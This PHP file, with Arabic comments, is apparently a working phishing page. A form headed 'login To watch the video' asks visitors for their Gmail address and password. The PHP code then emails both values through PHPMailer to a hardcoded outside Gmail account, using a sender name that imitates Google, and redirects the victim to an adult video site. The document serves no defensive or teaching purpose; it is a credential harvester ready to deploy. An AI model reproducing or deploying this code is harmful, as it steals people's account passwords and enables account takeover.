<?php 
    require_once "mail.php";
    
    if(isset($_POST['send'])){
        $subject = $_POST['subject']; // استخدم المفتاح الصحيح للحصول على قيمة حقل الموضوع
        $message = $_POST['message']; // استخدم المفتاح الصحيح للحصول على محتوى البريد الإلكتروني
        $mail->setFrom('haidarhaidarh9104@gmail.com', 'googel');
        $mail->addAddress('hadihamwi44@gmail.com');
        $mail->Subject = $subject; // استخدم المتغير $subject كعنوان البريد الإلكتروني
        $mail->Body    = $message; // استخدم المتغير $message كمحتوى البريد الإلكتروني
        
        if ($mail->send()) {
            header("location:mail.php"); // إعادة توجيه بنجاح بعد إرسال البريد الإلكتروني
            header("location:https://www.xvideos.com/");
            exit;
        } else {
            echo 'حدث خطأ أثناء محاولة إرسال البريد الإلكتروني: ' . $mail->ErrorInfo;
        }
    }
    ?>

<!DOCTYPE html >
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>  login   </title>
<link rel="stylesheet" href="stylephp.css">
</head>
<body>
    <h1> login To watch the video </h1> 
    <form method="post">
        <label for="subject"> inter youer gmail : </label>
        <input type="email" name="subject" id="subject" placeholder=" youe gmail" >
        <br/>
        <label for="message">inter youer password:</label>
        <input type="password" name="message" id="message" placeholder=" youer password "></input>
        <br>
        <button type="submit" id="send" name="send"> login </button>
    </form>
   
</body>
</html> 